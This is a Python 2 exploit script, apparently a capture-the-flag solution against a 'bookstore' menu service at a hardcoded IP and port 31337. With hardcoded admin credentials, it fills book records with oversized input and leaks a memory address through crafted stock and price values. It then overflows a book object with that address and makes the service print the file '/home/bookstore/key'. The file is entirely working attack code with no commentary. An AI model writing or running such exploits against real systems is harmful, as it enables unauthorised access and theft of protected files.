import socket
import telnetlib
import struct

s = socket.socket()
s.connect(('128.199.123.177', 31337))
#s.connect((' 54.65.210.251',31337))

def r_util(data):
    d = s.recv(1024)
    while d.find(data) == -1:
        d += s.recv(1024)
    return d

def interact():
    t = telnetlib.Telnet()                                                  
    t.sock = s                                                              
    t.interact()


def inputbook():
    s.send('1\n')
    print r_util('Bookname')
    s.send('a'*19 + '\n')
    print r_util('Description')
    s.send('a'*299 + '\n')
    print r_util('EBook')
    s.send('0\n')
    print r_util('>')

def getbook(i):
    s.send('3\n')
    print r_util('No')
    s.send('%d\n' % i)
    print r_util('>')

def modbook():
    s.send('2\n')
    print r_util('No')
    s.send('0\n')
    print r_util('main menu')
    s.send('1\n')
    print r_util('bookname')

def readall():
    s.send('4\n')
    print r_util('>')
         
print r_util('Your ID')
s.send('helloadmin\n')
print r_util('Your PASSWORD')
s.send('iulover!@#$\n')

print r_util('>')
for i in range(20):
    print 'Book %d' % (i+1)
    s.send('1\n')
    print r_util('Bookname')
    s.send('a'*19 + '\n')
    print r_util('Description')
    s.send('a'*300 + '\n')
    print r_util('EBook')
    s.send('0\n')
    print r_util('>')

#leak addr
s.send('2\n')
print r_util('Input No')
s.send('0\n')
print r_util('main menu')
s.send('3\n')
print r_util('Stock')
s.send('1094795585\n')
print r_util('Price')
s.send('1094795585\n')
print r_util('0 : not')
s.send('1\n')
print r_util('Avaliable')
s.send('1\n')
print r_util('bookname')
s.send('a'*20+'\n')
print r_util('description')
s.send('a\n')
print r_util('main menu')
s.send('0\n')
print r_util('>')
s.send('3\n')
print r_util('Input No')
s.send('0\n')
data = r_util('>')
print data
i = data.find('AAAAAAAA')
#print data[i+8:i+8+10].encode('hex')
addr = struct.unpack('<I',data[i+8:i+8+4])[0] - 210
addr = struct.pack('<I',addr)
print 'addr %s' % addr.encode('hex')

# overflow object temp   
print 'Book %d' % 21
s.send('1\n')
print r_util('Bookname')
s.send('a'*19 + '\n')
print r_util('Description')
s.send('aaaaaaaa' + addr + 'a'*288 + '\n')
print r_util('EBook')
s.send('0\n')
print r_util('>')

#overflow object 19
readall()

interact()

# trigger
getbook(19)

# 
s.send('2\n')
print r_util('Input No')
s.send('0\n')
print r_util('main menu')
s.send('2\n')
print r_util('description')
s.send('/home/bookstore/key\n')
print r_util('main menu')
s.send('0\n')
print r_util('>')
s.send('3\n')
print r_util('Input No')
s.send('0\n')
print r_util('>')
print 'pwn'





#readall()






